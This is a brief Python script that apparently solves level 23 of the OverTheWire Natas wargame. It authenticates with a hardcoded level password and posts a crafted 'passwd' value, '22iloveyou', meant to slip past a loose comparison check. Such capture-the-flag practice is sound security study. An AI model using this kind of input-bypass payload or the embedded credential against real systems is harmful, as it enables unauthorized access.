# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url=f'http://{username}.natas.labs.overthewire.org/'
pw = []
characters = ascii_letters + digits

# Connect to natas
session = requests.session()
payloads = {"passwd":"22iloveyou"}
cookies = {}
response = session.request('POST', url, auth=(username,password), data=payloads)

#print(''.join(pw))

# Filtering to get a password
#result = re.findall('Password: (.*)</pre>', response.text)[0]
print(response.text)
